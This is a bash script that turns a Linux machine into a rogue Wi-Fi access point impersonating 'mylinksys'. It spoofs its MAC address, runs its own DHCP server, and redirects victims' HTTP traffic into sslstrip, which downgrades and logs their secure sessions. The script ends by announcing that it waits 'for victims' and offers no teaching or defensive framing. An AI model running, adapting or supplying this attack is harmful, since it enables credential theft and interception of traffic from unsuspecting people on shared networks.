#!/bin/bash


#____[start of config]_________________________

# these two values can be overwritten using 
# arguments to the command
essid="mylinksys"
channel="11"

subnet="192.168.100.0"
startip="192.168.100.100"
endip="192.168.100.200"
broadcast="192.168.100.255"
router="192.168.100.1"

netmask="255.255.255.0"
dns="8.8.8.8"


#____[end of config]___________________________

# override the default essid if one is provided
if [[ ! -z ${1} ]]; then 
	essid="${1}"
fi

# override the default channel if one is provided
if [[ ! -z ${2} ]]; then 
	channel="${2}"
fi 

function clear_iptables {
	iptables --flush
	iptables --table nat --flush
	iptables --table nat --delete-chain
	iptables --delete-chain
}

function cleanup {
	echo "* cleaning up"
	killall sslstrip
	killall dhcpd3
	rm -rf /tmp/dhcpd
	rm -f /tmp/dhcpd.conf
	ifconfig at0 down
	killall airbase-ng
	clear_iptables
	echo "* end of script"
	exit 0
}

trap cleanup INT

echo "* creating dummy dhcpd.conf"
cat << EOF > /tmp/dhcpd.conf
ddns-update-style ad-hoc;
default-lease-time 600;
max-lease-time 7200;
subnet ${subnet} netmask ${netmask} {
	option subnet-mask ${netmask};
	option broadcast-address ${broadcast};
	option routers ${router};
	option domain-name-servers ${dns};
	range ${startip} ${endip};
}
EOF

echo "* starting airbase-ng essid ${essid} on channel ${channel}"
airbase-ng -e "${essid}" -q -c ${channel} mon0 &
sleep 3

echo "* spoofing MAC address for at0"
ifconfig at0 down
macchanger -a at0

echo "* bringing up at0 and setting route"
ifconfig at0 up
ifconfig at0 ${router} netmask ${netmask}
route add -net ${subnet} netmask ${netmask} gw ${router}

echo "* starting dhcpd3"
mkdir -p /tmp/dhcpd
touch /tmp/dhcpd/dhcpd.leases
chown -R dhcpd:dhcpd /tmp/dhcpd
dhcpd3 -q -cf /tmp/dhcpd.conf -pf /tmp/dhcpd/dhcpd.pid -lf /tmp/dhcpd/dhcpd.leases at0

echo "* setting up forwarding rules"
clear_iptables
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
iptables --append FORWARD --in-interface at0 -j ACCEPT 

mygw=$(grep nameserver /etc/resolv.conf | head -1 | cut -d" " -f2)
echo "* using ${mygw} as gateway"
iptables --table nat --append PREROUTING --protocol udp --dport 53 -j DNAT --to ${mygw}

iptables -t nat -D PREROUTING 1
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000

echo 1 > /proc/sys/net/ipv4/ip_forward

ssslog="sslstrip.${RANDOM}"
echo "* starting sslstrip and logging results to ${ssslog}"
sslstrip -f -k -w ${ssslog} & 

echo "* setup complete, now we wait for victims!"
while :; do
	sleep 60
done;
